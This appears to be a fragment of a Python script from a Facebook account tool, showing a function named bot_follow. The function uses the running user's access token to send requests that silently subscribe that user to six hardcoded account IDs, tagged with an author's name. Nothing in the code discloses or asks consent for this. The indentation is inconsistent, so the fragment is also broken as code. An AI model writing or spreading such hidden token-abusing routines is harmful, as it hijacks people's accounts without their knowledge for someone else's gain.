...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #RANA MZ
    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #RANA MZ
    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #RANA MZ
    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #RANA MZ
    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #RANA MZ
    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #RANA MZ
    	menu()
